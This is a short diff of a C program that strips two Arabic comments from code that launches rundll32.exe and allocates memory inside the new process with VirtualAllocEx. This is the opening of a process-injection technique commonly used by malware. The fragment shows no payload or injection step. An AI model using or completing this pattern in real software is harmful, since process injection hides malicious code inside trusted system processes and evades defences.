@@ -11,7 +11,6 @@ int main() {
     PROCESS_INFORMATION pi = { 0 };
     si.cb = sizeof(si);
 
-    // شغّل rundll32.exe
     if (!CreateProcessA(
         "C:\\Windows\\System32\\rundll32.exe",
         NULL, NULL, NULL, FALSE,
@@ -25,7 +24,6 @@ int main() {
 
     Sleep(1000);
 
-    // خصص ذاكرة في العملية الجديدة
     LPVOID remoteMemory = VirtualAllocEx(
         pi.hProcess,
         NULL,
